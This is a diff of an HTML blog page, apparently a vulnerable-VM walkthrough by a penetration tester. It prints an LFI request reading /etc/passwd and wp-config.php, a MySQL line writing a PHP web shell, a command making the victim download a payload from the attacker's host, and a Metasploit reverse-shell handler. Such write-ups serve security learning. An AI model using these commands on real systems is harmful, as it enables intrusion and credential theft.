@@ -79,80 +79,49 @@
     <h2 class="subtitle is-5">December 24, 2016 by Alex Flores</h2>
     
     <div class="content">
-      
-
-<p>Adding the IP address of the VM to the hosts file allows one to cut down on some typing.</p>
-
-<p><img src="https://i.imgur.com/cazlgnf.png" alt="" /></p>
-
+      <p>Adding the IP address of the VM to the hosts file allows one to cut down on some typing.</p>
+<p><img src="https://i.imgur.com/cazlgnf.png" alt=""></p>
 <h2 id="executive-summary">Executive Summary</h2>
-
 <p>This machine had several services running, some of which revealed employee names and accounts that could
 later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract
 database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script
 ran every 20 minutes as the <code>root</code> user and that the script was writable to our non-privileged user. This was
 leveraged to create a <code>root</code> shell by replacing the file contents with a malicious payload.</p>
-
 <h2 id="execution">Execution</h2>
-
 <p>An initial recon scan on the target revealed the following services:</p>
-
-<pre><code class="language-bash.prettyprint">&gt;&gt; onetwopunch -t ip_addresses.txt -p tcp
-</code></pre>
-
-<p><img src="https://i.imgur.com/YeosV0b.png" alt="" /></p>
-
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; onetwopunch -t ip_addresses.txt -p tcp
+</code></pre><p><img src="https://i.imgur.com/YeosV0b.png" alt=""></p>
 <p>All together, individual inspection of the services revealed a plethora of information about the company and
 its employees.
 This section will cover the most direct route to <code>root</code>,
 but see the <a href="#additional-discovery">Additional Discovery</a> section for that information.</p>
-
 <p>Using <code>nikto</code> against the service on port <code>12380</code> revealed additional paths using the https protocol.</p>
-
-<pre><code class="language-bash.prettyprint">&gt;&gt; nikto -host vm:12380
-</code></pre>
-
-<p><img src="https://i.imgur.com/DTF5i00.png" alt="" /></p>
-
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; nikto -host vm:12380
+</code></pre><p><img src="https://i.imgur.com/DTF5i00.png" alt=""></p>
 <p>The site hosted at <code>/blogblog</code> is a Wordpress blog with a vulnerable plug-in, as discovered by <code>wpscan</code>.</p>
-
-<pre><code class="language-bash.prettyprint">wpscan -u https://vm:12380/blogblog/
-</code></pre>
-
-<p><img src="https://i.imgur.com/uzdO1dx.png" alt="" />
-<img src="https://i.imgur.com/U2NyDnu.png" alt="" />
-<img src="https://i.imgur.com/LrEOKFq.png" alt="" /></p>
-
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">wpscan -u https://vm:12380/blogblog/
+</code></pre><p><img src="https://i.imgur.com/uzdO1dx.png" alt="">
+<img src="https://i.imgur.com/U2NyDnu.png" alt="">
+<img src="https://i.imgur.com/LrEOKFq.png" alt=""></p>
 <p><a href="https://www.exploit-db.com/exploits/39646/">This LFI vulnerability</a> allows an attacker to read the contents
 of a file on the system by using that file as a &ldquo;thumbnail&rdquo; for a post. An attacker could use this to read
 the contents of the Wordpress configuration file which has database credentials. The user account list for
 this machine was also acquired using this method.</p>
-
-<pre><code class="language-bash.prettyprint">&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../../../../../etc/passwd&quot;
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../../../../../etc/passwd&quot;
 &gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&quot;
-</code></pre>
-
-<p><img src="https://i.imgur.com/XMcARrC.png" alt="" /></p>
-
+</code></pre><p><img src="https://i.imgur.com/XMcARrC.png" alt=""></p>
 <p>By curling the &ldquo;image&rdquo; urls, the contents can be read.</p>
-
-<p><img src="https://i.imgur.com/CVtnKiK.png" alt="" />
-<img src="https://i.imgur.com/rfez3zi.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/CVtnKiK.png" alt="">
+<img src="https://i.imgur.com/rfez3zi.png" alt=""></p>
 <p>With credentials and an open 3306 port, an attacker can log in and create a malicious file that would allow
 remote code execution.</p>
-
-<pre><code class="language-bash.prettyprint">&gt;&gt; mysql -h vm -u root -p wordpress
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; mysql -h vm -u root -p wordpress
 
 mysql&gt;&gt; SELECT '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' INTO OUTFILE '/root/www/rce.php'
-</code></pre>
-
-<p><img src="https://i.imgur.com/h0gsLrZ.png" alt="" /></p>
-
+</code></pre><p><img src="https://i.imgur.com/h0gsLrZ.png" alt=""></p>
 <p>With remote code execution enabled, an attacker can download a malicious payload that initiates a reverse
 shell.</p>
-
-<pre><code class="language-bash.prettyprint"># start a web server to host the payload
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># start a web server to host the payload
 &gt;&gt; systemctl start apache2
 
 #create the payload in the web directory
@@ -161,13 +130,9 @@ shell.</p>
 # trigger remote commands that download the payload from the attacker's computer
 &gt;&gt; curl &quot;vm/rce.php?cmd=wget 192.168.110.101/qq.php&quot;
 &gt;&gt; curl &quot;vm/rce.php?cmd=ls&quot;
-</code></pre>
-
-<p><img src="https://i.imgur.com/5WdoFhk.png" alt="" /></p>
-
+</code></pre><p><img src="https://i.imgur.com/5WdoFhk.png" alt=""></p>
 <p>A listener/handler is configured and the reverse shell kicked off on the victim computer</p>
-
-<pre><code class="language-bash.prettyprint">&gt;&gt; msfconsole -x &quot;use exploit/multi/handler&quot;
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; msfconsole -x &quot;use exploit/multi/handler&quot;
 
 msfconsole&gt;&gt; set PAYLOAD php/meterpreter_reverse_tcp
 msfconsolemsfconsole&gt;&gt; set LPORT 443
@@ -175,56 +140,37 @@ msfconsole&gt;&gt; exploit -j
 
 # start the shell
 &gt;&gt; curl &quot;vm/qq.php&quot;
-</code></pre>
-
-<p><img src="https://i.imgur.com/Gxqwui2.png" alt="" /></p>
-
-<p>An attacker can now enumerate the contents of the victim&rsquo;s file system, allowing them identify any vulnerable
+</code></pre><p><img src="https://i.imgur.com/Gxqwui2.png" alt=""></p>
+<p>An attacker can now enumerate the contents of the victim's file system, allowing them identify any vulnerable
 or mis-configured services that would allow them to elevate privileges. In this case, a cron script was
 running a world-modifiable file as root.</p>
-
-<p><img src="https://i.imgur.com/I0kuii9.png" alt="" />
-<img src="https://i.imgur.com/bg9dpXH.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/I0kuii9.png" alt="">
+<img src="https://i.imgur.com/bg9dpXH.png" alt=""></p>
 <p>Further inspection of this scheduled task:</p>
-
-<p><img src="https://i.imgur.com/WXEowHC.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/WXEowHC.png" alt=""></p>
 <p>This task runs as the root user. All that was needed to become root was to replace the contents of the script
 with a reverse shell.</p>
-
-<p><img src="https://i.imgur.com/vFqTefn.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/vFqTefn.png" alt=""></p>
 <h2 id="additional-discovery">Additional Discovery</h2>
-
 <p>SMB enumeration and unprotected shares revealed some employee names and personal notes
-<img src="https://i.imgur.com/VEFkW99.png" alt="" /></p>
-
+<img src="https://i.imgur.com/VEFkW99.png" alt=""></p>
 <p>Port 666 was serving a zip file of a screenshot of another personal note. The exif contained some notes for
 the attacker.
-<img src="https://i.imgur.com/vJBqGGF.png" alt="" /></p>
-
+<img src="https://i.imgur.com/vJBqGGF.png" alt=""></p>
 <p>The anonymous ftp login also leaks information.
-<img src="https://i.imgur.com/fW3Nl8k.png" alt="" />
-<img src="https://i.imgur.com/aFFIp9P.png" alt="" /></p>
-
-<p>Port 80 scan initially returned what looked like a user&rsquo;s dotfiles. This gave me the idea that someone may be
+<img src="https://i.imgur.com/fW3Nl8k.png" alt="">
+<img src="https://i.imgur.com/aFFIp9P.png" alt=""></p>
+<p>Port 80 scan initially returned what looked like a user's dotfiles. This gave me the idea that someone may be
 running a web server from their home directory.
-<img src="https://i.imgur.com/w3143f7.png" alt="" /></p>
-
+<img src="https://i.imgur.com/w3143f7.png" alt=""></p>
 <p>The Wordpress site could have been used as another vector for a shell by adding a reverse shell plug-in. The
 users and passwords were crackable with the rockyou word list. Some users also reused their Wordpress
 passwords for their machine accounts.</p>
-
-<pre><code class="language-bash.prettyprint">&gt;&gt; wpscan -u https://vm:12380/blogblog/ --enumerate u
-</code></pre>
-
-<p><img src="https://i.imgur.com/v1GKKbb.png" alt="" /></p>
-
-<p>Without accessing the computer&rsquo;s <code>/etc/passwd</code> file, this gathering of information revealed the existence of
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; wpscan -u https://vm:12380/blogblog/ --enumerate u
+</code></pre><p><img src="https://i.imgur.com/v1GKKbb.png" alt=""></p>
+<p>Without accessing the computer's <code>/etc/passwd</code> file, this gathering of information revealed the existence of
 the following employees and a accounts:</p>
-
-<pre><code class="language-bash.prettyprint">barry
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">barry
 dave
 elly
 fred
@@ -240,7 +186,6 @@ tim
 vicki
 zoe
 </code></pre>
-
     </div>
     
         <div class="nav-left">
